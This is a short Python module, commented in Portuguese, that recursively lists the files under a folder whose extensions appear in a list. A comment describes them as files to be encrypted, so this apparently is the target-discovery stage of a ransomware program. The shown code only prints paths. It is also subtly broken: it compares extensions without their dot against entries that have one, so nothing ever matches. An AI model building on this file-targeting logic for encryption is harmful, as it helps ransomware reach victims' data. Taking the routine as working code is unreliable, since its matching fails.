import os

def discovery(initial_path):

    #extensoes de arquivos a serem criptografados

    extensoes = [
        '.JPG', '.txt'
    ]

    for dirpath, dirs, files in os.walk(initial_path):
        for _file in files:
            absolute_path = os.path.abspath(os.path.join(dirpath, _file))
            ext = absolute_path.split('.')[-1]
            if ext in extensoes:
                yield absolute_path

#isto só é executado quando voce executa o metodo diretamente

if __name__ ==  '__main__':
    
    x = discovery(os.getcwd())

    for i in x:
        print(i)